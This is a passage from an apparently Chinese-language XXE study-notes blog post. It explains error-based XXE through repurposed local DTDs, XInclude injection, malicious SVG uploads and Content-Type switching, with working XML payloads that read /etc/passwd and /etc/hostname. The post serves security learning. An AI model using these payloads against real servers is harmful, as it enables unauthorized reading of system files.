&#x4E2D;&#x4E0D;&#x5141;&#x8BB8;&#xFF08;&#x67D0;&#x4E9B;&#x89E3;&#x6790;&#x5668;&#x53EF;&#x80FD;&#x4F1A;&#x63A5;&#x53D7;&#xFF0C;&#x4F46;&#x8BB8;&#x591A;&#x89E3;&#x6790;&#x5668;&#x4E0D;&#x4F1A;&#xFF09;</p>
<p><strong>&#x5F53;&#x5E26;&#x5916;&#x4EA4;&#x4E92;&#x88AB;&#x963B;&#x6B62;&#x65F6;&#xFF0C;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;&#x5E26;&#x5916;&#x8FDE;&#x63A5;&#x7A83;&#x53D6;&#x6570;&#x636E;&#xFF0C;&#x4E5F;&#x65E0;&#x6CD5;&#x4ECE;&#x8FDC;&#x7A0B;&#x670D;&#x52A1;&#x5668;&#x52A0;&#x8F7D;&#x5916;&#x90E8; DTD&#xFF0C;&#x6B64;&#x65F6;&#x53C8;&#x8BE5;&#x5982;&#x4F55;&#x5229;&#x7528;&#xFF1F;</strong></p>
<p>&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x7531;&#x4E8E; XML &#x8BED;&#x8A00;&#x89C4;&#x8303;&#x4E2D;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x4ECD;&#x6709;&#x53EF;&#x80FD;&#x89E6;&#x53D1;&#x5305;&#x542B;&#x654F;&#x611F;&#x6570;&#x636E;&#x7684;&#x9519;&#x8BEF;&#x4FE1;&#x606F;</p>
<p>&#x5982;&#x679C;&#x6587;&#x6863;&#x4F7F;&#x7528;&#x5185;&#x90E8;&#x548C;&#x5916;&#x90E8;&#x6DF7;&#x5408;&#x5F0F;&#x7684; DTD &#x58F0;&#x660E;&#xFF0C;&#x5219;&#x5185;&#x90E8; DTD &#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x5728;&#x5916;&#x90E8; DTD &#x4E2D;&#x58F0;&#x660E;&#x7684;&#x5B9E;&#x4F53;&#x3002;&#x53D1;&#x751F;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x653E;&#x5BBD;&#x4E86;&#x5728; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x7684;&#x5B9A;&#x4E49;&#x5185;&#x4F7F;&#x7528;&#x53E6;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x7684;&#x9650;&#x5236;</p>
<p>&#x8FD9;&#x610F;&#x5473;&#x7740;&#xFF0C;&#x5982;&#x679C;&#x653B;&#x51FB;&#x8005;&#x4F7F;&#x7528;&#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x4E86;&#x5728;&#x5916;&#x90E8; DTD &#x4E2D;&#x58F0;&#x660E;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;&#x5219;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x4ECE;&#x5185;&#x90E8; DTD &#x4E2D;&#x4F7F;&#x7528;&#x57FA;&#x4E8E;&#x9519;&#x8BEF;&#x7684; XXE &#x6280;&#x672F;&#x3002;&#x5F53;&#x7136;&#xFF0C;&#x5982;&#x679C;&#x5E26;&#x5916;&#x8FDE;&#x63A5;&#x88AB;&#x963B;&#x6B62;&#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x4ECE;&#x8FDC;&#x7A0B;&#x4F4D;&#x7F6E;&#x52A0;&#x8F7D;&#x5916;&#x90E8; DTD&#x3002;&#x76F8;&#x53CD;&#xFF0C;&#x5B83;&#x8FD8;&#x5FC5;&#x987B;&#x5F97;&#x662F;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x670D;&#x52A1;&#x5668;&#x672C;&#x5730;&#x7684;&#x5916;&#x90E8; DTD &#x6587;&#x4EF6;</p>
<p>&#x672C;&#x8D28;&#x4E0A;&#xFF0C;&#x8BE5;&#x653B;&#x51FB;&#x65B9;&#x5F0F;&#x6D89;&#x53CA;&#x8C03;&#x7528;&#x672C;&#x5730;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0A;&#x6070;&#x597D;&#x5B58;&#x5728;&#x7684; DTD &#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x8BE5;&#x6587;&#x4EF6;&#x4E2D;&#x5DF2;&#x5B9A;&#x4E49;&#x8FC7;&#x7684;&#x5B9E;&#x4F53;&#xFF0C;&#x4ECE;&#x800C;&#x89E6;&#x53D1;&#x5305;&#x542B;&#x654F;&#x611F;&#x6570;&#x636E;&#x7684;&#x89E3;&#x6790;&#x9519;&#x8BEF;</p>
<p>&#x5047;&#x8BBE;&#x670D;&#x52A1;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0A;&#x7684; <code>/usr/local/app/schema.dtd</code> &#x4F4D;&#x7F6E;&#x6709;&#x4E00;&#x4E2A; DTD &#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x4E14;&#x6B64; DTD &#x6587;&#x4EF6;&#x5B9A;&#x4E49;&#x4E86;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; <strong>custom_entity</strong> &#x7684;&#x5B9E;&#x4F53;&#x3002;&#x653B;&#x51FB;&#x8005;&#x5C31;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x6DF7;&#x5408; DTD &#x6765;&#x89E6;&#x53D1;&#x5305;&#x542B; <code>/etc/passwd</code> &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684; XML &#x89E3;&#x6790;&#x9519;&#x8BEF;&#x4FE1;&#x606F;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/local/app/schema.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % custom_entity &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p>&#x8BE5; DTD &#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x6B65;&#x9AA4;&#xFF1A;</p>
<ul>
<li>&#x5B9A;&#x4E49;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; local_dtd &#x7684; XML &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x5176;&#x4E2D;&#x5305;&#x542B;&#x670D;&#x52A1;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0A;&#x5B58;&#x5728;&#x7684;&#x5916;&#x90E8; DTD &#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;</li>
<li>&#x91CD;&#x65B0;&#x5B9A;&#x4E49; custom_entity &#x53C2;&#x6570;&#x5B9E;&#x4F53;&#xFF0C;&#x8BE5;&#x5B9E;&#x4F53;&#x5DF2;&#x7ECF;&#x5728;&#x5916;&#x90E8; DTD &#x6587;&#x4EF6;&#x4E2D;&#x5B9A;&#x4E49;&#x3002;&#x53C8;&#x88AB;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x4E3A;&#x57FA;&#x4E8E;&#x9519;&#x8BEF;&#x7684; XXE &#x5229;&#x7528;&#xFF0C;&#x7528;&#x4E8E;&#x89E6;&#x53D1;&#x5305;&#x542B; <code>/etc/passwd</code> &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x7684;&#x9519;&#x8BEF;&#x6D88;&#x606F;</li>
<li>&#x4F7F;&#x7528; <code>%local_dtd;</code>&#xFF0C;&#x4EE5;&#x4FBF;&#x89E3;&#x91CA;&#x5916;&#x90E8; DTD&#xFF0C;&#x5305;&#x62EC;&#x91CD;&#x65B0;&#x5B9A;&#x4E49; custom_entity &#x5B9E;&#x4F53;&#xFF0C;&#x5F15;&#x53D1;&#x9519;&#x8BEF;</li>
</ul>
<p>&#x7531;&#x4E8E;&#x6B64; XXE &#x653B;&#x51FB;&#x6D89;&#x53CA;&#x91CD;&#x65B0;&#x5229;&#x7528;&#x670D;&#x52A1;&#x5668;&#x6587;&#x4EF6;&#x7CFB;&#x7EDF;&#x4E0A;&#x73B0;&#x6709;&#x7684; DTD&#xFF0C;&#x56E0;&#x6B64;&#x5173;&#x952E;&#x8981;&#x6C42;&#x662F;&#x627E;&#x5230;&#x5408;&#x9002;&#x7684;&#x6587;&#x4EF6;&#x3002;&#x8FD9;&#x5B9E;&#x9645;&#x4E0A;&#x662F;&#x5F88;&#x7B80;&#x5355;&#x7684;&#xFF0C;&#x56E0;&#x4E3A;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x8FD4;&#x56DE;&#x4E86; XML &#x89E3;&#x6790;&#x5668;&#x629B;&#x51FA;&#x7684;&#x4EFB;&#x4F55;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#xFF0C;&#x6240;&#x4EE5;&#x53EA;&#x9700;&#x8981;&#x5C1D;&#x8BD5;&#x4ECE;&#x5185;&#x90E8; DTD &#x5185;&#x52A0;&#x8F7D;&#x5B83;&#x4EEC;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x8F7B;&#x677E;&#x679A;&#x4E3E;&#x672C;&#x5730; DTD &#x6587;&#x4EF6;</p>
<p>&#x4F8B;&#x5982;&#xFF0C;&#x4F7F;&#x7528; GNOME &#x684C;&#x9762;&#x73AF;&#x5883;&#x7684; Linux &#x7CFB;&#x7EDF;&#x901A;&#x5E38;&#x5728; <code>/usr/share/yelp/dtd/docbookx.dtd</code> &#x4E2D;&#x5177;&#x6709; DTD &#x6587;&#x4EF6;&#x3002;&#x7531;&#x6B64;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x4EE5;&#x4E0B; XXE Payload &#x6765;&#x6D4B;&#x8BD5;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x5B58;&#x5728;&#xFF0C;&#x82E5;&#x7F3A;&#x5C11;&#x8BE5;&#x6587;&#x4EF6;&#xFF0C;&#x5219;&#x4F1A;&#x5BFC;&#x81F4;&#x62A5;&#x9519;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p> &#x5728;&#x6D4B;&#x8BD5;&#x4E86;&#x5E38;&#x89C1; DTD &#x6587;&#x4EF6;&#x5217;&#x8868;&#x4EE5;&#x627E;&#x5230;&#x5B58;&#x5728;&#x7684;&#x6587;&#x4EF6;&#x4E4B;&#x540E;&#xFF0C;&#x9700;&#x8981;&#x83B7;&#x53D6;&#x8BE5;&#x6587;&#x4EF6;&#x7684;&#x526F;&#x672C;&#x5E76;&#x5BF9;&#x5176;&#x8FDB;&#x884C;&#x68C0;&#x67E5;&#xFF0C;&#x4EE5;&#x627E;&#x5230;&#x53EF;&#x4EE5;&#x91CD;&#x65B0;&#x5B9A;&#x4E49;&#x7684;&#x5B9E;&#x4F53;&#x3002; &#x7531;&#x4E8E;&#x5305;&#x542B; DTD &#x6587;&#x4EF6;&#x7684;&#x8BB8;&#x591A;&#x5E38;&#x89C1;&#x7CFB;&#x7EDF;&#x90FD;&#x662F;&#x5F00;&#x6E90;&#x7684;&#xFF0C;&#x901A;&#x5E38;&#x53EF;&#x4EE5;&#x901A;&#x8FC7; Internet &#x641C;&#x7D22;&#x5FEB;&#x901F;&#x83B7;&#x53D6;&#x6587;&#x4EF6;&#x7684;&#x526F;&#x672C;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x4F7F;&#x7528; GNOME &#x684C;&#x9762;&#x73AF;&#x5883;&#x7684;&#x7CFB;&#x7EDF;&#x901A;&#x5E38;&#x5728; <code>/usr/share/yelp/dtd/docbookx.dtd</code> &#x4E2D;&#x5305;&#x542B;&#x6709;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; <code>ISOamso</code> &#x7684;&#x5B9E;&#x4F53;&#x3002;Payload &#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">    &lt;!ENTITY % local_dtd SYSTEM &quot;file:////usr/share/yelp/dtd/docbookx.dtd&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % ISOamso &apos;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span><br><span class="line">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span><br><span class="line">        &amp;#x25;eval;</span><br><span class="line">        &amp;#x25;error;</span><br><span class="line">    &apos;&gt;</span><br><span class="line">    %local_dtd;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/10.png" alt="image-20191113172341325"></p>
<h1 id="&#x5BFB;&#x627E;-XXE-&#x6CE8;&#x5165;&#x7684;&#x9690;&#x85CF;&#x653B;&#x51FB;&#x9762;"><a href="#&#x5BFB;&#x627E;-XXE-&#x6CE8;&#x5165;&#x7684;&#x9690;&#x85CF;&#x653B;&#x51FB;&#x9762;" class="headerlink" title="&#x5BFB;&#x627E; XXE &#x6CE8;&#x5165;&#x7684;&#x9690;&#x85CF;&#x653B;&#x51FB;&#x9762;"></a>&#x5BFB;&#x627E; XXE &#x6CE8;&#x5165;&#x7684;&#x9690;&#x85CF;&#x653B;&#x51FB;&#x9762;</h1><p>&#x8BB8;&#x591A;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5E38;&#x89C4; HTTP &#x6D41;&#x91CF;&#x5305;&#x542B; XML &#x683C;&#x5F0F;&#x6570;&#x636E;&#x8BF7;&#x6C42;&#xFF0C;&#x8FD9;&#x4F7F;&#x5F97; XXE &#x6CE8;&#x5165;&#x6F0F;&#x6D1E;&#x7684;&#x653B;&#x51FB;&#x9762;&#x770B;&#x8D77;&#x6765;&#x5F88;&#x660E;&#x663E;&#x3002;&#x5728;&#x53E6;&#x4E00;&#x4E9B;&#x4E0D;&#x5305;&#x542B; XML &#x683C;&#x5F0F;&#x6570;&#x636E;&#x8BF7;&#x6C42;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5219;&#x5F88;&#x96BE;&#x770B;&#x51FA;&#x5229;&#x7528;&#x9762;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x5982;&#x679C;&#x80FD;&#x627E;&#x5BF9;&#x5730;&#x65B9;&#xFF0C;&#x8FD8;&#x662F;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x5305;&#x542B;&#x4EFB;&#x4F55; XML &#x8BF7;&#x6C42;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x53D1;&#x73B0; XXE &#x6F0F;&#x6D1E;</p>
<h2 id="Xinclude-attacks"><a href="#Xinclude-attacks" class="headerlink" title="Xinclude attacks"></a>Xinclude attacks</h2><p>&#x4E00;&#x4E9B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x63A5;&#x53D7;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x540E;&#xFF0C;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x5C06;&#x5176;&#x5D4C;&#x5165;&#x5230; XML &#x6587;&#x6863;&#xFF0C;&#x518D;&#x89E3;&#x6790;&#x8BE5;&#x6587;&#x6863;</p>
<p>&#x4E00;&#x4E2A;&#x7B80;&#x5355;&#x7684;&#x4F8B;&#x5B50;&#x662F;&#xFF0C;&#x5BA2;&#x6237;&#x7AEF;&#x63D0;&#x4EA4;&#x7684;&#x6570;&#x636E;&#x88AB;&#x653E;&#x5165;&#x540E;&#x7AEF; SOAP &#x8BF7;&#x6C42;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x540E;&#x7AEF; SOAP &#x670D;&#x52A1;&#x5904;&#x7406;&#x3002;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x65E0;&#x6CD5;&#x8FDB;&#x884C;&#x7ECF;&#x5178;&#x7684; XXE &#x653B;&#x51FB;&#x3002;&#x56E0;&#x4E3A;&#x4F60;&#x65E0;&#x6CD5;&#x63A7;&#x5236;&#x6574;&#x4E2A; XML &#x6587;&#x6863;&#xFF0C;&#x4E5F;&#x5C31;&#x65E0;&#x6CD5;&#x5B9A;&#x4E49;&#x6216;&#x4FEE;&#x6539; DOCTYPE &#x5143;&#x7D20;&#x3002;&#x4F46;&#x662F;&#xFF0C;&#x53EF;&#x80FD;&#x53EF;&#x4EE5;&#x4F7F;&#x7528; <strong>Xinclude</strong></p>
<p>Xinclude &#x662F; XML &#x89C4;&#x8303;&#x7684;&#x4E00;&#x90E8;&#x5206;&#xFF0C;&#x8BE5;&#x89C4;&#x8303;&#x5141;&#x8BB8;&#x4ECE;&#x5B50;&#x6587;&#x6863;&#x4E2D;&#x6784;&#x5EFA; XML &#x6587;&#x6863;&#xFF0C;&#x53EF;&#x4EE5;&#x5728; XML &#x6587;&#x6863;&#x7684;&#x4EFB;&#x4F55;&#x6570;&#x636E;&#x503C;&#x4E2D;&#x653E;&#x7F6E; Xinclude &#x653B;&#x51FB;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x9002;&#x7528;&#x4E8E;&#x5728;&#x4EC5;&#x53EF;&#x63A7;&#x5236;&#x670D;&#x52A1;&#x5668;&#x7AEF; XML &#x6587;&#x6863;&#x4E2D;&#x5355;&#x4E2A;&#x6570;&#x636E;&#x9879;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x6267;&#x884C;&#x653B;&#x51FB;</p>
<p>&#x8981;&#x6267;&#x884C; Xinclude &#x653B;&#x51FB;&#xFF0C;&#x9700;&#x8981;&#x5F15;&#x7528; Xinclude &#x547D;&#x540D;&#x7A7A;&#x95F4;&#xFF0C;&#x5E76;&#x63D0;&#x4F9B;&#x8981;&#x5305;&#x542B;&#x7684;&#x6587;&#x4EF6;&#x8DEF;&#x5F84;&#x3002;&#x4F8B;&#x5982;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;</span><br><span class="line">&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p>&#x9ED8;&#x8BA4;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Xinclude &#x4F1A;&#x5C1D;&#x8BD5;&#x5C06;&#x5305;&#x542B;&#x7684;&#x6587;&#x6863;&#x89E3;&#x6790;&#x4E3A; XML&#xFF0C;&#x7531;&#x4E8E; <code>/etc/passwd</code> &#x4E0D;&#x662F;&#x6709;&#x6548;&#x7684; XML&#xFF0C;&#x56E0;&#x6B64;&#x9700;&#x8981;&#x5728; Xinclude &#x6307;&#x4EE4;&#x4E2D;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;&#x989D;&#x5916;&#x7684;&#x5C5E;&#x6027;&#xFF08;<code>parse=&quot;text&quot;</code>&#xFF09;&#x6765;&#x66F4;&#x6539;&#x6B64;&#x884C;&#x4E3A;&#x3002;&#x6700;&#x7EC8; Payload &#x5982;&#x4E0B;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;foo xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include parse=&quot;text&quot; href=&quot;file:///etc/passwd&quot;/&gt;&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/11.png" alt="image-20191113183941197"></p>
<p>&#x9B54;&#x6539;&#x51FA;&#x4E86;&#x9053; <strong>Xinclude attacks</strong> &#x9898;&#xFF0C;&#x79FB;&#x6B65;&#xFF1A;<a href="http://c0r1.com/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/#3-&#x5C0F;&#x7ED3;" target="_blank" rel="noopener">Day4 strpos &#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;</a></p>
<h2 id="&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8FDB;&#x884C;-XXE"><a href="#&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8FDB;&#x884C;-XXE" class="headerlink" title="&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8FDB;&#x884C; XXE"></a><strong>&#x901A;&#x8FC7;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x8FDB;&#x884C; X</strong>XE</h2><p>&#x4E00;&#x4E9B;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4E0A;&#x4F20;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x670D;&#x52A1;&#x5668;&#x7AEF;&#x8FDB;&#x884C;&#x5904;&#x7406;&#x3002;&#x4E00;&#x4E9B;&#x5E38;&#x89C1;&#x7684;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x4F7F;&#x7528; XML &#x6216;&#x5305;&#x542B; XML &#x5B50;&#x7EC4;&#x4EF6;&#x3002;&#x57FA;&#x4E8E; XML &#x683C;&#x5F0F;&#x7684;&#x793A;&#x4F8B;&#x662F; Office &#x6587;&#x6863;&#x683C;&#x5F0F;&#xFF08;&#x4F8B;&#x5982; DOCX&#xFF09;&#x548C;&#x56FE;&#x50CF;&#x683C;&#x5F0F;&#xFF08;&#x4F8B;&#x5982; SVG&#xFF09;</p>
<p>&#x6BD4;&#x5982;&#xFF0C;&#x4E00;&#x4E2A;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x53EF;&#x80FD;&#x5141;&#x8BB8;&#x7528;&#x6237;&#x4E0A;&#x4F20;&#x56FE;&#x50CF;&#xFF0C;&#x5E76;&#x5728;&#x4E0A;&#x4F20;&#x540E;&#x7684;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x5904;&#x7406;&#x6216;&#x9A8C;&#x8BC1;&#x8FD9;&#x4E9B;&#x56FE;&#x50CF;&#x3002;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5E0C;&#x671B;&#x63A5;&#x6536; PNG &#x6216; JPEG &#x4E4B;&#x7C7B;&#x7684;&#x683C;&#x5F0F;&#xFF0C;&#x6211;&#x4EEC;&#x63D0;&#x4EA4; SVG &#x56FE;&#x50CF;&#xFF0C;&#x5176;&#x56FE;&#x50CF;&#x5904;&#x7406;&#x5E93;&#x4E5F;&#x6709;&#x53EF;&#x80FD;&#x652F;&#x6301;&#x3002;&#x7531;&#x4E8E; SVG &#x683C;&#x5F0F;&#x4F7F;&#x7528; XML&#xFF0C;&#x56E0;&#x6B64;&#x653B;&#x51FB;&#x8005;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x63D0;&#x4EA4;&#x6076;&#x610F;&#x7684; SVG &#x56FE;&#x50CF;&#x53D1;&#x73B0;&#x9690;&#x85CF;&#x7684; XXE &#x6F0F;&#x6D1E;</p>
<p>&#x4F8B;&#x5982;&#xFF0C;&#x6784;&#x9020;&#x4EE5;&#x4E0B; SVG &#x6587;&#x4EF6;&#x63D0;&#x4EA4;&#xFF1A;</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; standalone=&quot;yes&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM &quot;file:///etc/hostname&quot; &gt; ]&gt;</span><br><span class="line">&lt;svg width=&quot;128px&quot; height=&quot;128px&quot; xmlns=&quot;http://www.w3.org/2000/svg&quot; xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot; version=&quot;1.1&quot;&gt;</span><br><span class="line">&lt;text font-size=&quot;16&quot; x=&quot;0&quot; y=&quot;16&quot;&gt;&amp;xxe;&lt;/text&gt;</span><br><span class="line">&lt;/svg&gt;</span><br></pre></td></tr></table></figure>

<p>&#x4F7F; <code>/etc/hostname</code> &#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5728;&#x56FE;&#x7247;&#x4E2D;&#x663E;&#x793A;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/avatars.png" alt="avatars"></p>
<p>&#x5C1D;&#x8BD5;&#x4E00;&#x4E0B; <code>/etc/passwd</code> &#xFF1A;</p>
<p><img src="/2019/11/12/XXE-&#x5B66;&#x4E60;&#x7B14;&#x8BB0;/avatars2.png" alt="avatars"></p>
<p>&#x54C8;&#x54C8;&#xFF0C;&#x5934;&#x50CF;&#x9650;&#x5236; <code>128px * 128px</code>&#xFF0C;&#x5B57;&#x4F53;&#x592A;&#x5C0F;&#x4F1A;&#x5931;&#x771F;</p>
<h2 id="&#x901A;&#x8FC7;&#x4FEE;&#x6539;-Content-Type-&#x8FDB;&#x884C;-XXE"><a href="#&#x901A;&#x8FC7;&#x4FEE;&#x6539;-Content-Type-&#x8FDB;&#x884C;-XXE" class="headerlink" title="&#x901A;&#x8FC7;&#x4FEE;&#x6539; Content-Type &#x8FDB;&#x884C; XXE"></a>&#x901A;&#x8FC7;&#x4FEE;&#x6539; Content-Type &#x8FDB;&#x884C; XXE</h2><p>&#x5927;&#x591A;&#x6570;&#x7684; POST &#x8BF7;&#x6C42;&#x90FD;&#x4F7F;&#x7528; HTML &#x8868;&#x5355;&#x751F;&#x6210;&#x7684;&#x9ED8;&#x8BA4;&#x5185;&#x5BB9;&#x7C7B;&#x578B;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;<code>application/x-www-form-urlencoded</code>&#x3002;&#x4E00;&#x4E9B;&#x7F51;&#x7AD9;&#x5E0C;&#x671B;&#x4EE5;&#x8FD9;&#x79CD;&#x683C;&#x5F0F;&#x63A5;&#x53D7;&#x8BF7;&#x6C42;&#xFF0C;&#x4F46;&#x4E5F;&#x53EF;&#x80FD;&#x89E3;&#x6790;&#x5176;&#x4ED6;&#x5185;&#x5BB9;&#x7C7B;&#x578B;</p>
<p>&#x4F8B;&#x5982;&#xFF0C;&#x6B63;&#x5E38;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 7</span><br><span class="line"></span><br><span class="line">foo=bar</span><br></pre></td></tr></table></figure>

<p>&#x4FEE;&#x6539;&#x8BF7;&#x6C42;&#x4E3A;&#xFF1A;</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/action</span> HTTP/1.0</span><br><span class="line"><span class="attribute">Content-Type</span>: text/xml</span><br><span class="line"><span class="attribute">Content-Length</span>: 52</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;foo&gt;bar&lt;/foo&gt;</span><br></pre></td></tr></table></figure>

